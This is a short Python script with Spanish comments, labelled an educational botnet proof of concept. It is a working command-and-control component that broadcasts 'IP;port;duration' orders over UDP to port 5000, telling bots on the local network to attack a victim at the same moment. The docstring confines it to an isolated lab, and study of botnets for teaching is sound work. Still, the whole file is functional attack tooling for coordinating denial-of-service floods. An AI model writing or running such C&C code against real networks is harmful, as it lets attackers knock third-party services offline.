#!/usr/bin/env python3
"""
C&C (Command and Control) - PoC educativa de botnet.

Envia una orden de ataque por UDP broadcast. Todos los bots de la red
local que esten escuchando la reciben y atacan a la vez.

Uso solo en un laboratorio aislado y controlado.
"""
import socket
import argparse

# Puerto donde los bots escuchan las ordenes del C&C
PUERTO_CC = 5000


def enviar_orden(ip_victima, puerto_victima, duracion):
    # Creamos un socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Habilitamos el envio por broadcast
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # La orden es un texto simple: "IP;PUERTO;DURACION"
    orden = f"{ip_victima};{puerto_victima};{duracion}"

    # 255.255.255.255 = broadcast a toda la red local
    s.sendto(orden.encode(), ("255.255.255.255", PUERTO_CC))
    s.close()

    print(f"[C&C] Orden enviada: atacar a {ip_victima}:{puerto_victima} durante {duracion}s")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="C&C de la botnet (PoC)")
    p.add_argument("ip", help="IP de la victima")
    p.add_argument("puerto", type=int, help="Puerto de la victima")
    p.add_argument("duracion", type=int, help="Duracion del ataque en segundos")
    args = p.parse_args()

    enviar_orden(args.ip, args.puerto, args.duracion)
